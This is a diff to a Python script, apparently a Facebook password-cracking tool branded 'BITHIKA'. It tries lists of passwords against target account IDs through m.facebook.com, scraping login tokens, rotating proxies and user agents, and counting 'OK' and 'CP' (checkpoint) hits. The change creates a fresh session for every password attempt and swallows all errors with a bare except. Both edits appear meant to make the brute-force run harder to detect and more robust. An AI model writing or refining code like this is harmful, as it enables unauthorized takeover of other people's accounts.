@@ -796,7 +796,6 @@ def m1(ids,pwv):
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
     sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
     sys.stdout.flush()
-    session = requests.Session()
     proxy_u = random.choice(saved_proxies).strip()
     proxies = {'http':f'{proxy_u}'}
     ua = ugrn
@@ -806,6 +805,7 @@ def m1(ids,pwv):
     warna = random.choice(my_color)
     try:
         for pas in pwv:
+            session = requests.Session()
             free_fb = session.get('https://m.facebook.com').text
             info={
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -864,9 +864,8 @@ def m1(ids,pwv):
                 continue
             time.sleep(0.01)
         loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(30)
-    except Exception as e:
+ 
+    except:
         pass
 
 def m2(ids,pwv):
